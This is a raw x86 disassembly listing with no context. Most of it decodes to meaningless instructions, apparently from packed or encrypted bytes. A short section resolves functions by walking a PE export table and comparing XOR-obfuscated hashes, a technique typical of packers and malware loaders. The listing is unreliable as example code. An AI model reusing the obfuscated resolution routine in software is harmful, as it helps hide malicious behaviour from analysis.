  416107:	pop    esp
  416108:	(bad)  [edi+0x7534a83]
  41610e:	test   al,0xc4
  416110:	adc    ch,BYTE PTR [ecx-0x2034a85e]
  416116:	add    eax,ebp
  416118:	pop    edx
  416119:	jo     0x416159
  41611b:	ds dec edi
  41611d:	gs jo  0x41615f
  416120:	jmp    0xe391:0x38cd1b3c
  416127:	or     eax,0xffffffa9
  41612a:	outs   dx,BYTE PTR ds:[esi]
  41612b:	clc    
  41612c:	add    BYTE PTR [ebp-0x34b11cca],ch
  416132:	sbb    eax,DWORD PTR [ecx+0x6092abf0]
  416138:	mov    dl,0xf
  41613a:	stos   BYTE PTR es:[edi],al
  41613b:	out    0xb,eax
  41613d:	xor    BYTE PTR [edi+0x7f],al
  416140:	in     eax,0xfc
  416142:	sub    BYTE PTR [esi+0x62f31d17],cl
  416148:	cmp    BYTE PTR [ebx-0x5b41f5c3],0x5b
  41614f:	pop    ecx
  416150:	inc    ebp
  416151:	shl    DWORD PTR [eax],0x28
  416154:	std    
  416155:	and    bl,BYTE PTR [edx-0x4e]
  416158:	dec    esi
  416159:	mov    ah,0xfc
  41615b:	dec    edi
  41615c:	das    
  41615d:	lds    edi,FWORD PTR [esi-0x56]
  416160:	or     ebp,esi
  416162:	jns    0x4161bc
  416164:	pop    esi
  416165:	cld    
  416166:	sub    bl,dh
  416168:	inc    ebx
  416169:	push   es
  41616a:	add    bl,BYTE PTR [eax+ebp*4-0x64]
  41616e:	js     0x4161df
  416170:	popf   
  416171:	xor    eax,0xa2ec0066
  416176:	pop    ds
  416177:	cmp    eax,0xdf987aa
  41617c:	jle    0x4161a1
  41617e:	jne    0x4161df
  416180:	mov    ecx,0xa2bafe83
  416185:	and    eax,0xe2056d1f
  41618a:	or     esp,edi
  41618c:	mov    ds:0x5c72df23,eax
  416191:	dec    esp
  416192:	cmp    BYTE PTR [edx],ah
  416194:	in     eax,dx
  416195:	lock ret 0xb266
  416199:	js     0x41615f
  41619b:	sub    edi,edx
  41619d:	call   0xc9192a32
  4161a2:	add    eax,0x2ed5d795
  4161a7:	dec    ebx
  4161a8:	push   es
  4161a9:	sub    bh,BYTE PTR [edi]
  4161ab:	mov    edx,0xda887d46
  4161b0:	out    dx,al
  4161b1:	jl     0x4161a4
  4161b3:	pusha  
  4161b4:	ins    DWORD PTR es:[edi],dx
  4161b5:	adc    al,0x76
  4161b7:	fld    DWORD PTR [edi+eiz*8-0x4d]
  4161bb:	xchg   ebx,eax
  4161bc:	fcmovu st,st(5)
  4161be:	pop    ss
  4161bf:	mov    BYTE PTR [esi],dh
  4161c1:	mov    dh,0xb5
  4161c3:	(bad)
  4161c6:	jmp    0xd8ca9963
  4161cb:	(bad)  
  4161cc:	sub    DWORD PTR [eax+0x7c],ebp
  4161cf:	jl     0x4161f6
  4161d1:	jle    0x4161e3
  4161d3:	add    DWORD PTR [edx],0xffffffe8
  4161d6:	fwait
  4161d7:	(bad)  
  4161d8:	call   0x1eda3c20
  4161dd:	call   0xa6b2:0x98b5edc1
  4161e4:	js     0x416231
  4161e6:	ror    DWORD PTR [ebp+0x39],1
  4161e9:	mov    ecx,0x68efe6be
  4161ee:	sbb    DWORD PTR [ecx+0x68],ebp
  4161f1:	rcr    DWORD PTR [ebx],cl
  4161f3:	(bad)  
  4161f5:	rcr    BYTE PTR [edx+0x2276410e],cl
  4161fb:	jp     0x4161d4
  4161fd:	pop    ebp
  4161fe:	jae    0x416241
  416200:	scas   eax,DWORD PTR es:[edi]
  416201:	adc    al,0xf0
  416203:	push   ds
  416204:	div    dl
  416206:	and    edx,DWORD PTR [eax]
  416208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416209:	add    eax,0x8371e627
  41620e:	out    0x5a,al
  416210:	xchg   ecx,eax
  416211:	imul   ebx,DWORD PTR [ecx+0x74],0xec2c035c
  416218:	jle    0x4161a6
  41621a:	jb     0x416205
  41621c:	pop    eax
  41621d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41621e:	je     0x4161af
  416220:	or     ecx,DWORD PTR [eax-0x24a67161]
  416226:	mov    DWORD PTR [eax],esi
  416228:	push   ebx
  416229:	or     edx,DWORD PTR [ecx+ebp*8]
  41622c:	add    BYTE PTR [eax+ebp*8],0x9b
  416230:	dec    esi
  416231:	add    ch,BYTE PTR [edi+eax*4]
  416234:	repnz lea esp,[ebx]
  416237:	inc    ecx
  416238:	push   ecx
  416239:	jle    0x416244
  41623b:	or     BYTE PTR [eax+0x28],al
  41623e:	sub    ch,BYTE PTR [esi+0x16]
  416241:	in     eax,0x86
  416243:	xchg   ebx,eax
  416244:	es sbb al,0x99
  416247:	pop    esp
  416248:	stos   DWORD PTR es:[edi],eax
  416249:	inc    ebx
  41624a:	neg    BYTE PTR [edx-0x49]
  41624d:	lods   eax,DWORD PTR ds:[esi]
  41624e:	cmp    ebp,esi
  416250:	and    esi,DWORD PTR [ebp-0x3e]
  416253:	mov    edi,0xaaba5b32
  416258:	push   edi
  416259:	sbb    BYTE PTR [ecx-0x1b],bh
  41625c:	ffreep st(4)
  41625e:	xchg   ebx,eax
  41625f:	mov    ds:0x229970a0,al
  416264:	and    eax,0xf1b5ff0a
  416269:	fwait
  41626a:	es rcr al,cl
  41626d:	fild   DWORD PTR [edx+0x311d113d]
  416273:	jge    0x4162c0
  416275:	rcl    bl,cl
  416277:	(bad)  
  416278:	or     DWORD PTR [edi-0x6a],eax
  41627b:	inc    ecx
  41627c:	mov    bl,bl
  41627e:	in     eax,0xf4
  416280:	push   0xcfcad8d8
  416285:	ror    BYTE PTR [edi+0x35],1
  416288:	mov    eax,0x6a453de5
  41628d:	xor    ebx,edi
  41628f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416290:	jle    0x41626b
  416292:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416293:	je     0x416259
  416295:	not    BYTE PTR [ebp+0x18]
  416298:	sub    BYTE PTR [esi-0x30],dl
  41629b:	rcl    DWORD PTR ds:0x1a43c915,0xd7
  4162a2:	ret    0x8e4d
  4162a5:	(bad)  
  4162a6:	mov    BYTE PTR [ebx+0x2b],cl
  4162a9:	mov    al,0xb7
  4162ab:	xor    al,0x63
  4162ad:	in     al,0xb3
  4162af:	lahf   
  4162b0:	xchg   edi,eax
  4162b1:	shl    esp,1
  4162b3:	loop   0x4162ac
  4162b5:	add    eax,0x109d9d39
  4162ba:	xchg   esp,eax
  4162bb:	mov    al,ds:0x6d29520b
  4162c0:	jb     0x416253
  4162c2:	scas   eax,DWORD PTR es:[edi]
  4162c3:	cmp    DWORD PTR [eax-0x703548e],edx
  4162c9:	add    eax,DWORD PTR [ebp+0x60]
  4162cc:	adc    edi,DWORD PTR [edi+eiz*8]
  4162cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162d0:	leave  
  4162d1:	dec    esi
  4162d2:	ret    0xbf52
  4162d5:	add    eax,0xca41b24e
  4162da:	rcl    BYTE PTR [ecx-0x5a],1
  4162dd:	mov    eax,ds:0x85587472
  4162e2:	mov    ebp,0xe9139bef
  4162e7:	jb     0x416308
  4162e9:	sub    ah,dl
  4162eb:	in     al,dx
  4162ec:	push   es
  4162ed:	jle    0x41627b
  4162ef:	pop    edi
  4162f0:	mov    DWORD PTR [ecx+0x23a89473],ebx
  4162f6:	jno    0x4162fe
  4162f8:	mov    WORD PTR ds:0xb099e9da,?
  4162fe:	loop   0x416339
  416300:	xchg   esp,eax
  416301:	xchg   ecx,eax
  416302:	cmp    ebx,DWORD PTR [ebx+0x21]
  416305:	adc    edi,DWORD PTR [ebp+0xcae9623]
  41630b:	rcr    DWORD PTR [ebx+0x4e629505],cl
  416311:	xchg   bh,dh
  416313:	ret    0x85fd
  416316:	sub    al,0x25
  416318:	and    DWORD PTR [edi-0x14222161],esp
  41631e:	test   eax,0x7bdfd370
  416323:	inc    eax
  416324:	xchg   edi,eax
  416325:	or     dh,dl
  416327:	jmp    0x82f0fb50
  41632c:	mov    edx,0xd6f1fb77
  416331:	(bad)  
  416332:	pop    esi
  416333:	add    BYTE PTR [ebp-0x3b0be78c],0xe9
  41633a:	dec    eax
  41633b:	xor    eax,0x33e5e50e
  416340:	rcr    DWORD PTR [esi-0x628b9ce6],cl
  416346:	aaa    
  416347:	popa   
  416348:	fdiv   QWORD PTR [edx+0x62]
  41634b:	xchg   edx,eax
  41634c:	call   0x55be31
  416351:	and    DWORD PTR [eax-0x2b],ecx
  416354:	or     eax,DWORD PTR [ebp-0x80]
  416357:	test   BYTE PTR [edx+0x52fd2f43],cl
  41635d:	push   ss
  41635e:	shr    DWORD PTR [edx+0x77],cl
  416361:	pop    edi
  416362:	out    0xc8,al
  416364:	mov    ch,0xfe
  416366:	sbb    eax,0x27eda9e8
  41636b:	shl    DWORD PTR [eax+0x1f],1
  41636e:	sbb    DWORD PTR [ebx-0x7c],0x305a5481
  416375:	ss shl ecx,1
  416378:	push   esp
  416379:	mov    cl,0x71
  41637b:	neg    dl
  41637d:	loopne 0x416330
  41637f:	or     ebx,DWORD PTR [ecx+0x5c1a5d35]
  416385:	imul   ecx,ebx,0xffffff8f
  416388:	aam    0xcb
  41638a:	pop    eax
  41638b:	test   BYTE PTR [ebx-0x19c841c3],bl
  416391:	into   
  416392:	pop    ss
  416393:	xchg   esi,eax
  416394:	call   0x9fa2422c
  416399:	mov    ?,WORD PTR [ebp-0x1192ffd7]
  41639f:	nop
  4163a0:	adc    eax,0x19600f22
  4163a5:	addr16 mov ebp,0x40f82283
  4163ab:	cmp    edx,ebx
  4163ad:	repz out dx,al
  4163af:	jbe    0x416400
  4163b1:	adc    ch,ah
  4163b3:	cwde   
  4163b4:	xchg   DWORD PTR [ecx-0x57],edi
  4163b7:	je     0x416432
  4163b9:	or     dh,BYTE PTR [ebx]
  4163bb:	out    dx,al
  4163bc:	or     eax,0x6b8dcb76
  4163c1:	aad    0xc0
  4163c3:	inc    ebx
  4163c4:	aam    0x61
  4163c6:	xchg   edx,eax
  4163c7:	data16 and bh,BYTE PTR [esi+ebx*4-0x37cc199]
  4163cf:	or     esi,DWORD PTR [edx-0x69]
  4163d2:	adc    DWORD PTR [eax],edx
  4163d4:	add    esp,DWORD PTR [esi]
  4163d6:	ja     0x41641c
  4163d8:	add    eax,0x4f948261
  4163dd:	adc    esp,DWORD PTR [eax+eax*2]
  4163e0:	imul   esi,DWORD PTR [eax-0x47e52021],0xc
  4163e7:	shr    ecx,1
  4163e9:	mov    bh,0xd7
  4163eb:	in     eax,dx
  4163ec:	out    0xef,eax
  4163ee:	dec    ebx
  4163ef:	mov    ecx,0x90fb85ec
  4163f4:	push   cs
  4163f5:	jne    0x416411
  4163f7:	sar    DWORD PTR [ebp+ebx*1+0x6672dea7],1
  4163fe:	inc    edi
  4163ff:	xor    BYTE PTR [eax-0x2f0f5932],dh
  416405:	push   ebx
  416406:	adc    BYTE PTR es:[edx+0x2e],dh
  41640a:	test   DWORD PTR [ecx+0x346a5aa8],ecx
  416410:	jl     0x416469
  416412:	or     dh,ch
  416414:	sub    ebx,esi
  416416:	xor    ch,BYTE PTR [ecx+0x11]
  416419:	sahf   
  41641a:	xor    esp,DWORD PTR [edx]
  41641c:	mov    ds,edx
  41641e:	add    al,BYTE PTR [ecx]
  416420:	pop    es
  416421:	pop    es
  416422:	jne    0x41649d
  416424:	inc    ebx
  416425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416426:	xor    DWORD PTR [eax+0x3e],ebp
  416429:	jecxz  0x41649b
  41642b:	mov    BYTE PTR [esi+0x6fce56a3],ah
  416431:	or     BYTE PTR ds:0x7ce1156,al
  416437:	jp     0x41649e
  416439:	push   esi
  41643a:	inc    eax
  41643b:	sub    DWORD PTR [ebp+0x29],ecx
  41643e:	push   cs
  41643f:	xchg   edi,eax
  416440:	dec    ecx
  416441:	mov    ds:0x56d823e1,al
  416446:	and    al,0x5b
  416448:	test   BYTE PTR [esp+ebp*2],al
  41644b:	ins    BYTE PTR es:[edi],dx
  41644c:	call   0x4edc3254
  416451:	pop    es
  416452:	lods   eax,DWORD PTR ds:[esi]
  416453:	sar    DWORD PTR [edi],0xb3
  416456:	fsubr  st(4),st
  416458:	push   edi
  416459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41645a:	lea    esp,[ebp-0x20835f9b]
  416460:	shr    edx,cl
  416462:	das    
  416463:	out    dx,eax
  416464:	pushf  
  416465:	and    dl,BYTE PTR [eax+0xe0d68d]
  41646b:	cwde   
  41646c:	hlt    
  41646d:	cmp    eax,0xb47df3da
  416472:	in     al,dx
  416473:	push   ebx
  416474:	lahf   
  416475:	cmp    al,ah
  416477:	inc    ecx
  416478:	cmp    ch,BYTE PTR [edi]
  41647a:	and    esp,DWORD PTR [edx-0x43]
  41647d:	(bad)  
  41647e:	adc    al,0xfe
  416480:	cmc    
  416481:	hlt    
  416482:	mov    ?,ebp
  416484:	outs   dx,DWORD PTR ds:[esi]
  416485:	mov    edi,0xdfd3d5f6
  41648a:	inc    eax
  41648b:	sub    BYTE PTR [eax],dh
  41648d:	jno    0x416505
  41648f:	or     eax,0xa429278f
  416494:	mov    cs,WORD PTR [ebp+edi*4+0x50630229]
  41649b:	or     ebp,ecx
  41649d:	push   esi
  41649e:	jae    0x416501
  4164a0:	mov    edx,0x435b4c9b
  4164a5:	push   edx
  4164a6:	cmp    al,0x62
  4164a8:	dec    ebx
  4164a9:	xchg   DWORD PTR [ebx+0x30b2b39a],ecx
  4164af:	add    dl,dl
  4164b1:	mov    esi,0x3fb46f6b
  4164b6:	leave  
  4164b7:	lods   al,BYTE PTR ds:[esi]
  4164b8:	outs   dx,BYTE PTR ds:[esi]
  4164b9:	jns    0x416506
  4164bb:	adc    eax,0xb160ab9d
  4164c0:	push   edi
  4164c1:	mov    esi,0xb2c2ba76
  4164c6:	dec    ebx
  4164c7:	test   al,0xbd
  4164c9:	dec    ebx
  4164ca:	clc    
  4164cb:	in     al,0x4d
  4164cd:	mov    ecx,0xd6ae1553
  4164d2:	scas   al,BYTE PTR es:[edi]
  4164d3:	push   ss
  4164d4:	ins    DWORD PTR es:[edi],dx
  4164d5:	cmp    BYTE PTR [esi],al
  4164d7:	add    DWORD PTR [edx-0x6c03a079],ecx
  4164dd:	div    DWORD PTR [eax-0xac829b1]
  4164e3:	adc    al,0xf2
  4164e5:	dec    esi
  4164e6:	xchg   edi,eax
  4164e7:	shl    BYTE PTR [ebp+edi*2+0x7f4903bc],1
  4164ee:	ret    
  4164ef:	push   ecx
  4164f0:	and    ch,BYTE PTR [eax-0x5d]
  4164f3:	dec    esp
  4164f4:	pop    ebx
  4164f5:	shr    edx,cl
  4164f7:	std    
  4164f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164f9:	fistp  QWORD PTR [esi]
  4164fb:	mov    ds:0xbad4816a,al
  416500:	int    0x9c
  416502:	mov    dl,0x78
  416504:	es cdq 
  416506:	dec    eax
  416507:	xor    esp,DWORD PTR [edi+esi*2+0x10]
  41650b:	inc    eax
  41650c:	jl     0x4164b2
  41650e:	fbld   TBYTE PTR [esi-0x4ac9cfee]
  416514:	je     0x4164f2
  416516:	and    BYTE PTR [edx],al
  416518:	(bad)  
  416519:	pop    esi
  41651a:	mov    eax,ds:0x95323acf
  41651f:	adc    ch,BYTE PTR [ebx+0x1d]
  416522:	xchg   esp,eax
  416523:	call   0xb0b:0x540742fb
  41652a:	mov    bh,BYTE PTR [esp+ecx*2+0x5b]
  41652e:	push   cs
  41652f:	scas   eax,DWORD PTR es:[edi]
  416530:	sub    edi,DWORD PTR [edx]
  416532:	hlt    
  416533:	or     ch,BYTE PTR [eax-0x5a]
  416536:	jg     0x416506
  416538:	mov    ds:0xdbe9d93c,al
  41653d:	mov    al,ds:0xbbb9d4c1
  416542:	(bad)  
  416544:	jmp    0xdfa9:0xdbea8403
  41654b:	lock inc ebp
  41654d:	lea    edi,[edx+ebp*2+0x408dff65]
  416554:	sahf   
  416555:	or     al,0x27
  416557:	popa   
  416558:	cmc    
  416559:	sbb    al,0xb0
  41655b:	bound  ecx,QWORD PTR [edi]
  41655d:	call   0x8f006e36
  416562:	retf   
  416563:	cmp    al,0x2d
  416565:	std    
  416566:	fidivr WORD PTR es:[ebx+0x65]
  41656a:	mov    WORD PTR [edx],fs
  41656c:	inc    ebp
  41656d:	mov    al,0x9
  41656f:	mov    BYTE PTR [edx-0x45df69d3],dh
  416575:	test   BYTE PTR [edi-0x5250084e],0xa8
  41657c:	fmul   DWORD PTR [eax]
  41657e:	lods   eax,DWORD PTR ds:[esi]
  41657f:	mov    ecx,0x8e642b5a
  416584:	mov    bh,0x8d
  416586:	inc    eax
  416587:	xchg   ebp,eax
  416588:	lods   al,BYTE PTR ds:[esi]
  416589:	or     al,0x96
  41658b:	sbb    eax,0x4e70d24e
  416590:	stc    
  416591:	mov    al,0x6b
  416593:	call   0x7352e6e3
  416598:	sub    ecx,ebp
  41659a:	std    
  41659b:	jbe    0x416578
  41659d:	das    
  41659e:	and    al,0x4a
  4165a0:	xchg   BYTE PTR [edx-0x564fe1ff],ch
  4165a6:	ja     0x416565
  4165a8:	inc    ecx
  4165a9:	add    dl,BYTE PTR [esi-0x37dfe62f]
  4165af:	adc    BYTE PTR [ebx-0x45],cl
  4165b2:	inc    eax
  4165b3:	inc    esp
  4165b4:	mov    dh,0x87
  4165b6:	push   eax
  4165b7:	mov    bl,0x4e
  4165b9:	sub    al,0xe6
  4165bb:	es (bad) 
  4165bd:	cmp    eax,0x8acd8098
  4165c2:	gs stos BYTE PTR es:[edi],al
  4165c4:	ss loop 0x416625
  4165c7:	sbb    DWORD PTR [ecx],esi
  4165c9:	retf   0xa5e
  4165cc:	(bad)  
  4165cd:	call   0x768adba4
  4165d2:	pop    ds
  4165d3:	add    eax,0xfb085f41
  4165d8:	shr    BYTE PTR [edx+0x41bba81f],1
  4165de:	and    DWORD PTR [eax-0x67a1d7ba],edx
  4165e4:	jmp    0xd32d:0x6622eced
  4165eb:	pushf  
  4165ec:	int3   
  4165ed:	into   
  4165ee:	mov    esi,0xdeb66c4
  4165f3:	sbb    al,0xa9
  4165f5:	outs   dx,BYTE PTR ds:[esi]
  4165f6:	or     BYTE PTR [ebp-0x7af0bb2d],0x22
  4165fd:	add    BYTE PTR [eax],al
  4165ff:	add    BYTE PTR [esi+0xf],ah
  416602:	mov    esi,0x3b4bbb38
  416607:	add    BYTE PTR [eax],al
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    ch,al
  416673:	dec    ebx
  416674:	push   0x6123db5f
  416679:	(bad)  
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	ins    BYTE PTR es:[edi],dx
  41667f:	int3   
  416680:	scas   eax,DWORD PTR es:[edi]
  416681:	and    DWORD PTR [edx+0x2ffac7ce],edx
  416687:	cmp    DWORD PTR [esi],ebp
  416689:	xchg   ebp,eax
  41668a:	pop    ds
  41668b:	into   
  41668c:	cmp    BYTE PTR ds:0x3cd1a345,bl
  416693:	xor    eax,0x3604d9d5
  416698:	add    ch,BYTE PTR [edi]
  41669a:	mov    bl,BYTE PTR [ebx]
  41669c:	loopne 0x41667a
  41669e:	mov    esi,0x2cde3f42
  4166a3:	cdq    
  4166a4:	push   esi
  4166a5:	shr    BYTE PTR [ebx+0xb0786a1],cl
  4166ab:	cs int 0x20
  4166ae:	lock jle 0x416638
  4166b1:	nop
  4166b2:	aad    0x78
  4166b4:	fisttp QWORD PTR [ebp+0x5b109fd4]
  4166ba:	fstp   DWORD PTR gs:[ebx+eiz*2+0x63306bba]
  4166c2:	pushf  
  4166c3:	pop    eax
  4166c4:	mov    ebp,DWORD PTR [ecx+0x24]
  4166c7:	pop    ds
  4166c8:	pop    ebp
  4166c9:	mov    esp,0x57799a70
  4166ce:	cmp    BYTE PTR [ebx-0x4c],ch
  4166d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166d2:	call   0x8bed79d6
  4166d7:	fs aam 0x8d
  4166da:	xchg   esi,eax
  4166db:	push   ebp
  4166dc:	cs cld 
  4166de:	mov    dh,0xda
  4166e0:	add    esp,DWORD PTR [edi+0x72]
  4166e3:	test   BYTE PTR [edi-0x3f],bh
  4166e6:	pop    eax
  4166e7:	ret    
  4166e8:	fs jne 0x416675
  4166eb:	outs   dx,DWORD PTR ds:[esi]
  4166ec:	sub    ebx,DWORD PTR [ebp-0x6a]
  4166ef:	push   0xffffffa9
  4166f1:	push   esi
  4166f2:	nop
  4166f3:	repnz sbb ch,al
  4166f6:	into   
  4166f7:	sbb    BYTE PTR [edx-0x60],bl
  4166fa:	int3   
  4166fb:	mov    WORD PTR ds:0x35f80cec,?
  416701:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416703:	gs jbe 0x416772
  416706:	call   0xeebe24f
  41670b:	outs   dx,BYTE PTR ds:[esi]
  41670c:	inc    edx
  41670d:	addr16 dec ebx
  41670f:	in     al,dx
  416710:	pop    eax
  416711:	and    BYTE PTR [esi-0x13],0x76
  416715:	dec    edx
  416716:	rol    eax,0xd9
  416719:	jnp    0x41673e
  41671b:	sahf   
  41671c:	in     al,dx
  41671d:	mov    al,0xba
  41671f:	pop    esp
  416720:	dec    ebp
  416721:	sbb    al,0xf7
  416723:	adc    BYTE PTR [edi+0x7d],dh
  416726:	fst    st(5)
  416728:	jnp    0x416790
  41672a:	(bad)  
  41672b:	loopne 0x4166af
  41672d:	jp     0x4167a8
  41672f:	(bad)  
  416730:	xchg   edx,eax
  416731:	jmp    0x4166fd
  416733:	xor    eax,0x1c077cb2
  416738:	xchg   esp,eax
  416739:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41673b:	mov    DWORD PTR [eax+0x28],edi
  41673e:	pop    ss
  41673f:	mov    WORD PTR [edx-0x17a3312b],?
  416745:	imul   edx,DWORD PTR [ecx+0x7bc1fc9c],0xed135b1d
  41674f:	out    0xa5,eax
  416751:	enter  0x9d0,0xe9
  416755:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  416757:	call   0x9db8cd0d
  41675c:	outs   dx,DWORD PTR ds:[esi]
  41675d:	sub    BYTE PTR [eax-0x37],dh
  416760:	sahf   
  416761:	enter  0x727e,0xd
  416765:	shr    DWORD PTR [ebx+0x6f],cl
  416768:	test   ecx,esi
  41676a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41676b:	sub    BYTE PTR [eax-0x4],dh
  41676e:	test   eax,0xe58010e8
  416773:	retf   0x8bf5
  416776:	sbb    edx,esp
  416778:	fmul   QWORD PTR [ebp+0x1b]
  41677b:	push   ecx
  41677c:	xlat   BYTE PTR ds:[ebx]
  41677d:	jl     0x416706
  41677f:	mov    edi,0xb056c155
  416784:	inc    edi
  416785:	call   0x709585e7
  41678a:	push   ecx
  41678b:	add    esp,DWORD PTR [ecx]
  41678d:	jg     0x416739
  41678f:	(bad)  
  416791:	hlt    
  416792:	mov    cl,0x5
  416794:	fsubr  QWORD PTR [edx-0x51]
  416797:	jb     0x41675f
  416799:	test   BYTE PTR [ebp-0x79808e1c],ah
  41679f:	stos   DWORD PTR es:[edi],eax
  4167a0:	mov    bl,0x71
  4167a2:	push   ebx
  4167a3:	in     al,dx
  4167a4:	pop    es
  4167a5:	add    al,0x3d
  4167a7:	jmp    0x45dcab46
  4167ac:	jecxz  0x416732
  4167ae:	adc    dl,BYTE PTR [edi-0x4d0a20c9]
  4167b4:	cmc    
  4167b5:	mov    WORD PTR [edi+0x67],ss
  4167b8:	xlat   BYTE PTR ds:[ebx]
  4167b9:	and    BYTE PTR [esi-0x62],bh
  4167bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167bd:	out    0xed,al
  4167bf:	retf   0x8837
  4167c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167c3:	test   DWORD PTR [eax],edx
  4167c5:	push   ds
  4167c6:	add    al,0xed
  4167c8:	xchg   esi,eax
  4167c9:	es dec edx
  4167cb:	adc    al,0x71
  4167ce:	adc    esi,0x103cde95
  4167d4:	shl    BYTE PTR [ebx+edi*4-0x5e3793b5],0x97
  4167dc:	sahf   
  4167dd:	push   cs
  4167de:	cmc    
  4167df:	pusha  
  4167e0:	in     al,0xc0
  4167e2:	push   edx
  4167e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167e5:	out    dx,al
  4167e6:	(bad)  
  4167e7:	fdiv   QWORD PTR [ecx-0x1d]
  4167ea:	pop    ss
  4167eb:	cmp    ecx,0xffffffce
  4167ee:	or     dl,BYTE PTR [ebx+0x74]
  4167f1:	mov    al,0xb5
  4167f3:	and    eax,0xb5b85d5c
  4167f8:	loopne 0x416868
  4167fa:	stos   DWORD PTR es:[edi],eax
  4167fb:	fst    DWORD PTR [esi+0x6fd61908]
  416801:	test   al,0x99
  416803:	pop    ebx
  416804:	ret    
  416805:	leave  
  416806:	lock mov dl,0xe3
  416809:	mov    esi,0x929a959c
  41680e:	fstp   TBYTE PTR [ecx+edi*4]
  416811:	jns    0x416798
  416813:	or     bh,BYTE PTR [ebp-0x6e]
  416816:	push   edx
  416817:	arpl   WORD PTR [ebp+0x7a],si
  41681a:	add    ch,BYTE PTR [edi+0x4b2717bb]
  416820:	add    dh,BYTE PTR [eax+ecx*4]
  416823:	das    
  416824:	dec    edx
  416825:	(bad)  
  416826:	aad    0x86
  416828:	inc    esi
  416829:	imul   esp,DWORD PTR [ecx-0x2c],0xffffff80
  41682d:	into   
  41682e:	inc    BYTE PTR [ebx]
  416830:	pop    ds
  416831:	and    DWORD PTR [esp+esi*2],eax
  416834:	pop    ebp
  416835:	mov    bh,0x72
  416837:	mov    bh,0x2f
  416839:	and    DWORD PTR [edi-0x7ef83166],esp
  41683f:	cmp    al,0x9d
  416841:	inc    esi
  416843:	jae    0x4167c6
  416845:	and    BYTE PTR [edi],bh
  416847:	mov    al,ds:0xa1b54180
  41684c:	xchg   ecx,eax
  41684d:	xchg   edi,eax
  41684e:	inc    ebp
  41684f:	ins    DWORD PTR es:[edi],dx
  416850:	hlt    
  416851:	pop    es
  416852:	(bad)  
  416854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416855:	pop    edi
  416856:	dec    edx
  416857:	scas   eax,DWORD PTR es:[edi]
  416858:	cs (bad) 
  41685a:	aaa    
  41685b:	out    0xf6,al
  41685d:	je     0x4168b3
  41685f:	sub    ebp,DWORD PTR [ebp+0x32a53e32]
  416865:	sub    edx,DWORD PTR [edi+0xde063b3]
  41686b:	icebp  
  41686c:	dec    edx
  41686d:	stos   DWORD PTR es:[edi],eax
  41686e:	popa   
  41686f:	ins    DWORD PTR es:[edi],dx
  416870:	and    al,0x95
  416872:	mov    dl,0xc2
  416874:	xlat   BYTE PTR ds:[ebx]
  416875:	out    0xfc,eax
  416877:	and    dl,BYTE PTR [edi]
  416879:	data16 mov cl,0x6c
  41687c:	xor    esi,DWORD PTR [edi-0x2d]
  41687f:	xor    al,0xb7
  416881:	jmp    0x41681e
  416883:	sbb    eax,edx
  416885:	or     ecx,DWORD PTR [ebx]
  416887:	pop    esi
  416888:	or     DWORD PTR ds:0x49c46ef7,0x74f55407
  416892:	jle    0x416904
  416894:	sub    DWORD PTR [eax-0x586cccc6],esi
  41689a:	dec    ebp
  41689b:	sar    ebx,cl
  41689d:	pop    ebx
  41689e:	jne    0x416904
  4168a0:	(bad)  
  4168a1:	jnp    0x41688f
  4168a3:	inc    ebx
  4168a4:	inc    ebp
  4168a5:	es das 
  4168a7:	push   edx
  4168a8:	ror    DWORD PTR [esi],0x19
  4168ab:	jno    0x41689f
  4168ad:	lods   al,BYTE PTR ds:[esi]
  4168ae:	mov    ebp,0x50417e3b
  4168b3:	fistp  QWORD PTR [ebp+0x4f]
  4168b6:	pop    edx
  4168b7:	sahf   
  4168b8:	add    DWORD PTR [eax+0x5d],eax
  4168bb:	xchg   esp,eax
  4168bc:	and    eax,0x8a88e7ae
  4168c1:	popf   
  4168c2:	pusha  
  4168c3:	cld    
  4168c4:	sbb    ecx,DWORD PTR [esi+0xd]
  4168c7:	push   ebx
  4168c8:	inc    ebp
  4168c9:	mov    ecx,DWORD PTR [ecx-0x61]
  4168cc:	test   al,0x48
  4168ce:	sbb    esi,DWORD PTR [ebp+0x7ab13595]
  4168d4:	jmp    0xfa21:0xad67fd92
